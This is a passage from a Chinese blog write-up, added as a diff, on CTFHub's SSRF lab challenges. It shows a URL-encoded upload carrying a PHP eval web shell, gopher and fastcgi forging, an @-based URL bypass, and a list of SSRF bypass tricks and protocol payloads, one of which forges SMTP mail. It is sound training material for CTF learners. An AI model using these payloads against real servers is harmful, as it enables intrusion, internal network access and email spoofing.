Insecure-Requests:%25201%250D%250A%250D%250A-----------------------------414691864916047361701712488296%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%2522shell.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250A%253C?php%2520@eval($_POST%255Bshell%255D);?%253E%250D%250A-----------------------------414691864916047361701712488296%250D%250AContent-Disposition:%2520form-data;%2520name=%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2%250D%250A-----------------------------414691864916047361701712488296--</span><br></pre></td></tr></table></figure>
+
+<p>在进行一次最初的抓包，使用gopher协议进行伪造，最终获得flag</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151823321.png" alt="image-20220415182340143"></p>
+<h1 id="fastcgi协议"><a href="#fastcgi协议" class="headerlink" title="fastcgi协议"></a>fastcgi协议</h1><p>fastcgi是向php-fpm发送报文的，而由于php-fpm的默认端口是9000，所以我们用nc去监听一下9000端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9000&gt;yy.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h1><p>打开题目，发现有限制</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151852202.png" alt="image-20220415185235060"></p>
+<p>也就是url的参数值必须得含有<code>http://notfound.ctfhub.com</code>，所以这一题应该是绕过</p>
+<p>此处就可以采用@,也就是HTTP基本身份认证绕过</p>
+<p>HTTP基本身份认证允许Web浏览器或者其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式</p>
+<p>也就是：<a target="_blank" rel="noopener" href="http://www.xxx.com@www.yy.com的形式/">http://www.xxx.com@www.yy.com的形式</a></p>
+<p>因为这里有特定的网址，所以直接在后面加@+127.0.0.1</p>
+<p>所以直接构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>直接得到flag</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151910736.png" alt="image-20220415191018637"></p>
+<p>总结一下SSRF的绕过方法</p>
+<p>1.攻击本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure>
+
+<p>2.利用[::]</p>
+<p>http://[::]:80/ =&gt;<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
+<p>不加端口的话是http://[::]/</p>
+<p>3.利用@</p>
+<p>这里就是在指定的网址后加@+127.0.0.1</p>
+<p>4.利用短域名</p>
+<p><a target="_blank" rel="noopener" href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a> &gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
+<p>5.利用特殊域名</p>
+<p>原理是DNS解析</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/">http://127.0.0.1.xip.io/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.owasp.org.127.0.0.1.xip.io/">http://www.owasp.org.127.0.0.1.xip.io/</a></p>
+<p>6.利用DNS解析</p>
+<p>在域名上设置A记录，指向127.0.0.1<br>7.利用上传</p>
+<p>修改”type=file”为”type=url”</p>
+<p>比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</p>
+<p>8.利用句号</p>
+<p>127。0。0。1=&gt;127.0.0.1</p>
+<p>9.进行进制转换</p>
+<p>可以是十六进制，八进制等。<br>115.239.210.26 &gt;&gt;&gt; 16373751032<br>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成8进制<br>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p>
+<p>10.利用特殊地址</p>
+<p><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a></p>
+<p>11.利用协议</p>
+<p>Dict://</p>
+<p>dict://@:/d:<br>ssrf.php?url=dict://attacker:11111/</p>
+<p>SFTP://</p>
+<p>ssrf.php?url=s<a href="ftp://example.com:11111/">ftp://example.com:11111/</a></p>
+<p>TFTP://</p>
+<p>ssrf.php?url=t<a href="ftp://example.com:12346/TESTUDPPACKET">ftp://example.com:12346/TESTUDPPACKET</a></p>
+<p>LDAP://</p>
+<p>ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</p>
+<p>Gopher://</p>
+<p>ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%<a href="mailto:&#x33;&#x43;&#x68;&#97;&#99;&#x6b;&#x65;&#114;&#64;&#x73;&#x69;&#x74;&#x65;&#x2e;&#99;&#x6f;&#109;">&#x33;&#x43;&#x68;&#97;&#99;&#x6b;&#x65;&#114;&#64;&#x73;&#x69;&#x74;&#x65;&#x2e;&#99;&#x6f;&#109;</a>%3E%250d%250aRCPT%20TO%3A%<a href="mailto:&#51;&#67;&#x76;&#105;&#99;&#116;&#105;&#x6d;&#x40;&#115;&#105;&#x74;&#101;&#46;&#99;&#x6f;&#x6d;">&#51;&#67;&#x76;&#105;&#99;&#116;&#105;&#x6d;&#x40;&#115;&#105;&#x74;&#101;&#46;&#99;&#x6f;&#x6d;</a>%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%<a href="mailto:&#x33;&#x43;&#x68;&#x61;&#99;&#107;&#101;&#114;&#x40;&#x73;&#105;&#x74;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#x33;&#x43;&#x68;&#x61;&#99;&#107;&#101;&#114;&#x40;&#x73;&#105;&#x74;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>%3E%250d%250aTo%3A%20%<a href="mailto:&#51;&#67;&#x76;&#x69;&#99;&#116;&#105;&#x6d;&#x65;&#64;&#115;&#105;&#x74;&#101;&#46;&#x63;&#x6f;&#x6d;">&#51;&#67;&#x76;&#x69;&#99;&#116;&#105;&#x6d;&#x65;&#64;&#115;&#105;&#x74;&#101;&#46;&#x63;&#x6f;&#x6d;</a>%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>吴淑影
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/" title="ctfhub技能树web-SSRF">http://example.com/2022/04/11/ctfhub技能树web-SSRF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web-ctf/" rel="tag"># -web -ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/31/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91RCE/" rel="prev" title="ctfhub技能树RCE">
+      <i class="fa fa-chevron-left"></i> ctfhub技能树RCE
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/02/web%E7%BB%BC%E5%90%88wp/" rel="next" title="web综合wp">
+      web综合wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">1.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%9C%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">作用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="nav-number">2.</span> <span class="nav-text">内网访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">伪协议读取文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">4.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="nav-number">5.</span> <span class="nav-text">POST请求</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">6.</span> <span class="nav-text">上传文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastcgi%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">fastcgi协议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL-Bypass"><span class="nav-number">8.</span> <span class="nav-text">URL Bypass</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="吴淑影"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">吴淑影</p>
+  <div class="site-description" itemprop="description">Believe not all that you see nor half what you hear.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+
+
+
+      
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-ctf/" rel="tag">-web -ctf</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp-VNCTF/" rel="tag">-wp -VNCTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%88%B7%E9%A2%98/" rel="tag">web刷题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/" rel="tag">web常见漏洞及其修复</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp%E3%80%81/" rel="tag">wp、</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag">知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%95%BF%E5%AE%89%E6%88%98%E5%BD%B9/" rel="tag">长安战役</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003013号 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000196%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000196号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; Sun Dec 26 2021 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">吴淑影</span>
+</div>
+  <div class="powered-by">
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("12/25/2021 17:38:00");
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "影影已在此快乐的玩耍了 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+<br />
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">影影的家共种了35k朵花</span>
+</div>
+
+<br />
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    已经有<span id="busuanzi_value_site_pv"></span>人摘了影影种的花</span>
+    <span class="post-meta-divider"> </span>
+    其中<span id="busuanzi_value_site_uv"></span>人不留痕迹地跑了</span>
+    <span class="post-meta-divider"> </span>
+
+
+
+
+
+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'vcFyBSklL05djh0SlQ0i9Idk-gzGzoHsz',
+      appKey     : 'wFXz2jiwl2Jo3Q5LWDFdhUsv',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
+
+
+<script src="/js/cursor.js"></script>
+
+<script type="text/javascript">
+//只在桌面版网页启用特效
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
